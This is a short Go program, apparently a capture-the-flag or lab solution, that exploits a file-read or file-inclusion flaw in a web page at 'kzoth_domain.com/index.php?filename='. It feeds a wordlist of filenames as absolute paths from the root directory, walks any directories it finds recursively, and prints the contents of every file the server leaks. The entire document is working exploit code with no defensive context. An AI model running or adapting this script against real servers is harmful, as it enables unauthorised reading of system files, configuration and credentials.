package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	url 	:= "http://kzoth_domain.com/index.php?filename="

	files	:= make(map[string]string)

	// Read payload with list of interesting filenames / directories
	file, err := os.Open("Test Payloads.txt")
	if err != nil {
		panic(err)
	}
	defer file.Close()
	filenames, _ := ioutil.ReadAll(file)


	// Search for existing files
	paths:= []string{"/"}
	for {
		fmt.Printf("Search in [ %s ] directory\n", paths[0])

		for _, filename := range strings.Split(string(filenames), "\r\n") {
			filename = strings.Trim(filename, "\r\n\t ")

			// = Skip all web pages
			if strings.Contains(filename, ".php") || strings.Contains(filename, ".html") {
				continue
			}
	
			data := FileFromGetRequest(url + paths[0] + filename)

			if len(data) == 0 || filename == "" {
				continue
			}
	
			// = Clean response content
			content := string(data)[strings.Index(string(data), "<br> <br> <br>") + len([]rune("<br> <br> <br>")):]
			content  = strings.Split(content, "</body>")[0]
			content  = strings.Trim(content, "\n ")
	
			// = Add directory in search list
			if content == "" {
				paths = append(paths, paths[0] + filename + "/")
				continue
			}
	
			// == Print list of existing files
			if !strings.Contains(content, "Unable to open file!") {
				fmt.Println(" => " + paths[0] + filename)
				files[paths[0] + filename] = content

				fmt.Println(files[paths[0] + filename])
			}
		}

		if len(paths) != 1 {
			paths = paths[1:]
		} else {
			break
		}
	}

	fmt.Printf("Was found %d files\n", len(files))
}

func FileFromGetRequest(_url string) string {
	response, err := http.Get(_url)
	if err != nil {
		panic(err)
	}
	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		data, err := io.ReadAll(response.Body)
		if err != nil {
			panic(err)
		}
		return string(data)
	}

	return ""
}